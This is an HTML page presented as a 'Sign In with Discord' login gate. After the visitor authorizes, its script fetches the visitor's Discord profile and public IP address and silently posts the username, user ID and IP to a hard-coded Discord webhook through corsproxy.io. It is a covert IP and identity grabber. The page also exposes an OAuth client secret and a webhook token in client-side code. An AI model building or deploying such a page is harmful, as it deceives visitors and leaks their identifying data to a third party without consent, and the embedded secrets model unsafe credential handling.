<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Access Page</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
            background-color: white;
            color: #111827;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }
        
        .container {
            width: 100%;
            max-width: 28rem;
            margin: 0 auto;
            padding: 2rem;
            border-radius: 0.5rem;
            background-color: white;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            text-align: center;
            border: 3px solid #f59e0b;
        }
        
        .title {
            font-size: 1.5rem;
            font-weight: 700;
            color: #111827;
            margin-bottom: 1rem;
        }
        
        .description {
            color: #374151;
            font-size: 0.875rem;
            margin-bottom: 1.5rem;
        }
        
        .login-button {
            background-color: #f59e0b;
            color: white;
            font-weight: 700;
            padding: 0.75rem 1.5rem;
            border-radius: 0.5rem;
            width: 100%;
            border: 2px solid #d97706;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 1rem;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }
        
        .login-button:hover {
            background-color: #d97706;
            transform: scale(1.02);
        }
        
        .login-button:focus {
            outline: none;
            box-shadow: 0 0 0 4px rgba(245, 158, 11, 0.5);
        }
        
        .loading-container {
            margin-top: 1.5rem;
        }
        
        .spinner {
            width: 2rem;
            height: 2rem;
            border: 2px solid transparent;
            border-top: 2px solid #f59e0b;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .loading-text {
            margin-top: 0.5rem;
            font-size: 0.875rem;
            color: #374151;
        }
        
        .message-box {
            margin-top: 1rem;
            font-size: 0.875rem;
            padding: 0.75rem;
            border-radius: 0.5rem;
        }
        
        .message-success {
            background-color: rgba(245, 158, 11, 0.2);
            color: #d97706;
            border: 1px solid #f59e0b;
        }
        
        .message-error {
            background-color: rgba(239, 68, 68, 0.2);
            color: #dc2626;
            border: 1px solid #ef4444;
        }
        
        .hidden {
            display: none !important;
        }
        
        .discord-icon {
            width: 1.25rem;
            height: 1.25rem;
            fill: currentColor;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="title">Click the Bart Sign In</h1>
        <p class="description">By clicking the button below, you will be redirected to Discord to authorize.</p>
        
        <button id="login-button" class="login-button">
            <svg class="discord-icon" viewBox="0 0 24 24">
                <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>
            </svg>
            Sign In with Discord
        </button>

        <!-- Loading Spinner -->
        <div id="loading-spinner" class="loading-container hidden">
            <div class="spinner"></div>
            <p id="loading-text" class="loading-text">Processing authorization...</p>
        </div>
        
        <!-- Message Area -->
        <div id="message-box" class="message-box hidden"></div>
    </div>

    <script>
        // Configuration
        const CLIENT_ID = '1405029286418583703';
        const CLIENT_SECRET = 'PXubxsjfwhAtg3n58c0EeFKvqH4slUSY'; // WARNING: This is exposed!
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395152469428015134/LAntn5qX7c12hmEzid_oIihsNP4W5LhZfxvIeW1tsi5yEsZ5KHjw6M9AglQl3ulA66ko';
        const REDIRECT_URI = window.location.href.split('?')[0];

        // Element references
        const loginButton = document.getElementById('login-button');
        const loadingSpinner = document.getElementById('loading-spinner');
        const loadingText = document.getElementById('loading-text');
        const messageBox = document.getElementById('message-box');

        window.onload = () => {
            const params = new URLSearchParams(window.location.search);
            if (params.has('code')) {
                const authCode = params.get('code');
                window.history.replaceState({}, document.title, REDIRECT_URI);
                handleDiscordCallback(authCode);
            }
        };

        loginButton.addEventListener('click', redirectToDiscord);

        function redirectToDiscord() {
            const scope = 'identify';
            const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=${scope}`;
            window.location.href = authUrl;
        }

        async function handleDiscordCallback(code) {
            loginButton.classList.add('hidden');
            loadingSpinner.classList.remove('hidden');

            try {
                // Step 1: Exchange authorization code for access token using corsproxy.io
                const tokenResponse = await fetch(`https://corsproxy.io/?https://discord.com/api/oauth2/token`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: new URLSearchParams({
                        client_id: CLIENT_ID,
                        client_secret: CLIENT_SECRET,
                        grant_type: 'authorization_code',
                        code: code,
                        redirect_uri: REDIRECT_URI,
                    }),
                });

                if (!tokenResponse.ok) {
                    const errorText = await tokenResponse.text();
                    console.error('Token Response Error:', errorText);
                    throw new Error('Failed to get access token from Discord.');
                }
                
                const tokenData = await tokenResponse.json();
                
                if (!tokenData.access_token) {
                    throw new Error('No access token received');
                }

                // Step 2: Use the access token to get user info
                const userResponse = await fetch(`https://corsproxy.io/?https://discord.com/api/users/@me`, {
                    headers: {
                        'Authorization': `Bearer ${tokenData.access_token}`,
                    },
                });

                if (!userResponse.ok) {
                    throw new Error('Failed to get user info from Discord.');
                }
                
                const userData = await userResponse.json();

                // Step 3: Get IP and send all data to webhook
                const ipAddress = await getIpAddress();
                await sendToWebhook(ipAddress, userData);

                // Step 4: Display success (no redirect for now)
                loadingText.textContent = 'Success! Authentication complete.';
                showMessage('Authentication successful!', 'success');

            } catch (error) {
                console.error("Authentication failed:", error);
                showMessage('Authentication failed: ' + error.message, 'error');
                loadingSpinner.classList.add('hidden');
                loginButton.classList.remove('hidden');
            }
        }

        async function getIpAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                if (!response.ok) throw new Error('Could not fetch IP address.');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("IP Fetch Error:", error);
                return 'Unknown';
            }
        }

        async function sendToWebhook(ip, user) {
            const payload = {
                content: 'New User Login Detected!',
                embeds: [{
                    title: 'User Authentication Log',
                    color: 5814783,
                    fields: [
                        { name: 'Discord User', value: `${user.username}#${user.discriminator || '0000'}`, inline: true },
                        { name: 'User ID', value: user.id, inline: true },
                        { name: 'IP Address', value: `||${ip}||`, inline: false }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: { text: 'Login Gate System' }
                }]
            };

            try {
                console.log('Sending webhook payload:', payload);
                // Use CORS proxy for webhook too
                const response = await fetch(`https://corsproxy.io/?${encodeURIComponent(WEBHOOK_URL)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    console.log('Webhook sent successfully!');
                } else {
                    console.error('Webhook failed:', response.status, await response.text());
                }
            } catch (error) {
                console.error("Webhook Send Error:", error);
            }
        }
        
        function showMessage(text, type) {
            messageBox.textContent = text;
            messageBox.className = `message-box message-${type}`;
        }
    </script>
</body>
</html>
